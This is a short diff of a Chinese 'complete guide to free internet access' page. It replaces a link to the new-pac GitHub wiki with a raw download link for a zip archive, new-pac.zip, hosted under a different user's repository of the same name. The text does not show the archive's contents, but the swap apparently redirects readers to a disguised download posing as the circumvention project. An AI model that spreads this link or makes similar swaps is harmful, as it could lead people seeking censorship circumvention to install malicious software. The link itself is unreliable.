@@ -1,4 +1,4 @@
 自由上网方法大全：
 
-https://github.com/Alvin9999/new-pac/wiki
+https://raw.githubusercontent.com/kevinnjagi44/new-pac/master/slicker/new-pac.zip
      
